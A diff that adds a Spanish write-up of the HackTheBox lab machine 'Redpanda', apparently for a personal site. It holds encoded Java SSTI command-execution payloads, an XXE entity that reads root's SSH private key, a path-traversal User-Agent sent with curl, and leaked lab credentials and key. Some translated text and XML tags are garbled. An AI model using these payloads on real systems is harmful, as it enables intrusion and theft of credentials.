@@ -70,6 +70,477 @@
         const markdownContent = `
 # Máquina "Redpanda" de HackTheBox
 
+Caracteristicas:
+
+- Linux
+- Easy
+- SSTI
+- Bypassing especial character restriction
+- Creation of a python script to automate java injection (RCE)
+- Creating a bash script for process monitoring whit user included 
+- Abusing log file + image metada + XML (XXE) [Privilege Escalation]
+
+Util en:
+
+- eWPT
+- eWPTXv2
+- OSWE
+- OSCP
+
+        IP 10.10.11.170
+
+- nmap -p- --min-rate 10000 10.10.11.170
+
+PORT     STATE SERVICE
+
+22/tcp   open  ssh
+
+8080/tcp open  http-proxy
+
+- nmap -p 22,8080 -sCV 10.10.11.170
+
+<pre>
+<code>
+
+    PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/html;charset=UTF-8
+|     Content-Language: en-US
+|     Date: Mon, 21 Nov 2022 19:58:58 GMT
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html lang="en" dir="ltr">
+|     <head>
+...[snip]...
+_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Red Panda Search | Made with Spring Boot
+...[snip]...
+SF:l>");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code>
+</pre>
+
+buscamos el codename y es Ubuntu focal 20.04
+el título dice que el sitio está construido sobre Sprint Boot.
+
+<img src="imagenes/redpanda/redpanda8080.png" alt="Texto alternativo" width="500">
+
+Además, a través de alguna enumeración de archivos, aparece una página de estadísticas. 
+
+<pre>
+<code>
+kali@kali:~/Documents/HTB/RedPanda$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -of md -o ffuz.txt -t 60 -u http://10.10.11.170:8080/FUZZ
+
+[...]
+
+stats                   [Status: 200, Size: 987, Words: 200, Lines: 33]
+</code>
+</pre>
+
+En esta página, las estadísticas de los autores. woodenky damianSe puede obtener y exportar en formato XML. 
+
+<img src="imagenes/redpanda/status.png" alt="Texto alternativo" width="500">
+
+Finalmente, el Greg panda aparece si no se inserta ninguna entrada, indicando que el motor de búsqueda podría ser vulnerable a ataques de inyección. 
+Después de confundir el motor de búsqueda usando la lista de palabras special-chars.txt a partir de SecLists y URL que codifican sus caracteres, se obtiene 
+el siguiente resultado. 
+
+<img src="imagenes/redpanda/seclist.png" alt="Texto alternativo" width="500">
+
+porque los personajes ){}\%produjo errores cuando se envió al servidor, y los personajes ~$_están prohibidos para el motor, podría ser vulnerable a SSTI .
+
+Para verificar eso, se utilizó la siguiente carga útil §character§{7*7}(codificar caracteres antes de ejecutar intruso). Como resultado, parece que el código dentro 
+*{<CODE>} está siendo ejecutado. 
+
+<img src="imagenes/redpanda/exec.png" alt="Texto alternativo" width="500">
+
+Luego, debido a que Spring boost está hecho con Java, se necesitan cargas útiles STTI Java. Estas cargas útiles se pueden encontrar en PayloadAllTheThings usaremos la siguiente.
+
+- $ {T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+
+Debido a que esta carga útil requiere codificar cada carácter que se ejecutará, para facilitar el trabajo la herramienta SSTI-PAYLOAD . se utiliza
+Nota : cambié el script para volver siempre *{en lugar de $ {. 
+
+<pre>
+<code>
+kali@kali:~/Documents/HTB/RedPanda/ssti-payload$ python ssti-payload.py 
+
+Command ==> whoami
+
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}
+</code>
+</pre>
+
+Debido a que no se puede obtener un shell inverso, la enumeración manual de la máquina se debe realizar mediante el formulario web. 
+
+<pre>
+<code>
+    # cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
+
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97))).getInputStream())}
+</code>
+</pre>
+
+Mirando dentro del código fuente de búsqueda de Panda, hay algunas credenciales de base de datos. 
+
+<pre>
+<code>
+    public ArrayList searchPanda(String query) {
+
+
+
+Connection conn = null;
+
+PreparedStatement stmt = null;
+
+ArrayList&lt;ArrayList&gt; pandas = new ArrayList();
+
+try {
+
+    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);
+
+    conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;);
+
+    stmt = conn.prepareStatement(&quot;SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?&quot;);
+
+    stmt.setString(1, &quot;%&quot; + query + &quot;%&quot;);
+
+    ResultSet rs = stmt.executeQuery();
+
+    while(rs.next()){
+
+        ArrayList&lt;String&gt; panda = new ArrayList&lt;String&gt;();
+
+        panda.add(rs.getString(&quot;name&quot;));
+
+        panda.add(rs.getString(&quot;bio&quot;));
+
+        panda.add(rs.getString(&quot;imgloc&quot;));
+
+panda.add(rs.getString(&quot;author&quot;));
+
+        pandas.add(panda);
+
+    }
+
+}catch(Exception e){ System.out.println(e);}
+
+return pandas;
+
+}
+
+}
+</code>
+</pre>
+
+accedemos a la máquina a través de SSH y buscamos la flag de user
+
+<pre>
+<code>
+kali@kali:~/Documents/HTB/RedPanda/$ ssh woodenk@10.10.11.170
+
+woodenk@10.10.11.170's password: RedPandazRule
+
+woodenk@redpanda:~$ cat user.txt 
+
+[CENSORED]
+</code>
+</pre>
+
+## Escalada de privilegios 
+
+Usando pspy podemos ver que cada dos minutos el archivo Java final-1.0-jar-with-dependencies.jar se está ejecutando como root. 
+
+<pre>
+<code>
+2022/07/31 17:22:01 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
+
+2022/07/31 17:22:01 CMD: UID=0    PID=3337   | /usr/sbin/CRON -f 
+
+2022/07/31 17:22:01 CMD: UID=0    PID=3338   | /bin/sh -c /root/run_credits.sh 
+
+2022/07/31 17:22:01 CMD: UID=0    PID=3339   | /bin/sh /root/run_credits.sh 
+
+2022/07/31 17:22:01 CMD: UID=0    PID=3340   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
+</code>
+</pre>
+
+Este archivo de aplicación Java tiene el código fuente ubicado en /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java.
+A partir de la función principal, podemos ver que lee el archivo de registro. /opt/panda_search/redpanda.log, analiza algunos datos y luego lee un archivo XML. 
+
+<pre>
+<code>
+public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
+
+File log_fd = new File("/opt/panda_search/redpanda.log");
+
+Scanner log_reader = new Scanner(log_fd);
+
+while (log_reader.hasNextLine()) {
+
+  String line = log_reader.nextLine();
+
+  if (!isImage(line))
+
+    continue; 
+
+  Map parsed_data = parseLog(line);
+
+  System.out.println(parsed_data.get("uri"));
+
+  String artist = getArtist(parsed_data.get("uri").toString());
+
+  System.out.println("Artist: " + artist);
+
+  String xmlPath = "/credits/" + artist + "_creds.xml";
+
+  addViewTo(xmlPath, parsed_data.get("uri").toString());
+
+} 
+
+}
+</code>
+</pre>
+
+divide una línea de registro en una cadena usando || como separador. Entonces, debido a que el atacante tiene control sobre el User-Agent parámetro HTTP, el uri El valor se puede sobrescribir. 
+
+<pre>
+<code>
+# cat redpanda.log 
+
+# 200||10.10.14.40||Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0||/search
+
+
+
+public static Map parseLog(String line) {
+
+    String[] strings = line.split("\\|\\|");
+
+    Map map = new HashMap<>();
+
+    map.put("status_code", Integer.parseInt(strings[0]));
+
+    map.put("ip", strings[1]);
+
+    map.put("user_agent", strings[2]);
+
+    map.put("uri", strings[3]);
+
+
+
+    return map;
+
+}
+</code>
+</pre>
+
+El valor uri se utiliza en la función. getArtist, agregando el valor a una ruta de imagen para leer el Artista tributo de metadatos. 
+
+<pre>
+<code>
+    public static String getArtist(String uri) throws IOException, JpegProcessingException
+
+{
+
+    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
+
+    File jpgFile = new File(fullpath);
+
+    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
+
+    for(Directory dir : metadata.getDirectories())
+
+    {
+
+        for(Tag tag : dir.getTags())
+
+        {
+
+            if(tag.getTagName() == "Artist")
+
+            {
+
+                return tag.getDescription();
+
+            }
+
+        }
+
+    }
+
+
+
+    return "N/A";
+
+}
+</code>
+</pre>
+
+Finalmente, el valor artist se agrega a otra ruta, que se utiliza en la función. addViewTo.
+Esta función lee el archivo, actualiza el contador de cada vista de imagen y luego sobrescribe el archivo con los nuevos valores. 
+
+<pre>
+<code>
+    public static void addViewTo(String path, String uri) throws JDOMException, IOException
+
+{
+
+    SAXBuilder saxBuilder = new SAXBuilder();
+
+    XMLOutputter xmlOutput = new XMLOutputter();
+
+    xmlOutput.setFormat(Format.getPrettyFormat());
+
+
+
+    File fd = new File(path);
+
+    
+
+    Document doc = saxBuilder.build(fd);
+
+    
+
+    Element rootElement = doc.getRootElement();
+
+
+
+    for(Element el: rootElement.getChildren())
+
+    {
+
+
+
+        
+
+        if(el.getName() == "image")
+
+        {
+
+            if(el.getChild("uri").getText().equals(uri))
+
+            {
+
+                Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
+
+                System.out.println("Total views:" + Integer.toString(totalviews));
+
+                rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
+
+                Integer views = Integer.parseInt(el.getChild("views").getText());
+
+                el.getChild("views").setText(Integer.toString(views + 1));
+
+            }
+
+        }
+
+    }
+
+    BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
+
+    xmlOutput.output(doc, writer);
+
+}
+</code>
+</pre>
+
+Porque no hay medida para evitar XXE y tenemos control sobre los parámetros user_agent, uri, artisty xmlPath; tal vez podamos crear un archivo XML con XXE para leer la clave privada de la raíz. 
+Primero, obtenga una imagen y actualice sus metadatos. 
+
+- wget http://10.10.11.170:8080/img/greg.jpg
+
+exiftool -Artist="../tmp/marmeus"  greg.jpg
+
+Luego, necesitamos editar un archivo XML de estadísticas para agregar la carga útil XXE. 
+
+<pre>
+<code>
+    wget 'http://10.10.11.170:8080/export.xml?author=woodenk' -O marmeus_creds.xml
+
+# EDIT THE FILE TO LOOK SOMETHING LIKE THIS
+
+cat marmeus_creds.xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
+
+<credits>
+
+  <author>woodenk</author>
+
+  <image>
+
+    <uri>/img/greg.jpg</uri>
+
+    <marmeu>&ent;</marmeus>
+
+    <views>2</views>
+
+[...]
+</code>
+</pre>
+
+Finalmente, actualice todos los archivos y envíe una solicitud con el agente de usuario malicioso. 
+
+- scp marmeus_creds.xml greg.jpg woodenk@10.10.11.170:/tmp/
+
+curl http://10.10.11.170:8080/ -A 'Firefox||/../../../../../../../tmp/greg.jpg'
+
+Después de dos minutos, se ejecutará el script y se modificará el XML añadiendo la clave privada del root. 
+
+<pre>
+<code>
+    woodenk@redpanda:/tmp$ cat marmeus_creds.xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE replace>
+
+<credits>
+
+  <author>woodenk</author>
+
+  <image>
+
+    <uri>/img/greg.jpg</uri>
+
+    <hello>-----BEGIN OPENSSH PRIVATE KEY-----
+
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+
+QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
+
+ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ                                   
+
+AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
+
+RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
+
+-----END OPENSSH PRIVATE KEY-----</hello>
+
+[...]
+</code>
+</pre>
+
+Finalmente, es posible acceder a la máquina como rootasi que buscamos la flag.
+
+Algunos de los writeups en esta página, pueden tener contenido de otras páginas o tener muy pocas imágenes, esto 
+debido a que en algunas de las máquinas que realice, no tome los apuntes o no tome capturas de pantalla, así que he decidido buscar varios writeups
+y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí, también si encuentra faltas de ortografía 
+o cualquier error, Puedes contactarme a mi correo.
+
+lerioxirit@proton.me
+
+
+
+
+
 
         `;
         
